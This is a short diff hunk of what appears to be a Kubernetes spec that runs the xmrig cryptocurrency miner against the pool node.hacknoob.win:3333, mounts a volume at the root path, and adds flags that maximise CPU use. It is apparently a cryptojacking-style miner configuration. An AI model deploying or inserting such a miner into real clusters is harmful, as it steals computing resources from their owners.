@@ -23,6 +23,8 @@ spec:
     - node.hacknoob.win:3333
     - -u
     - master
+    - --cpu-no-yield
+    - --randomx-1gb-pages
     volumeMounts:
     - name: xmrig-volume-m
       mountPath: /
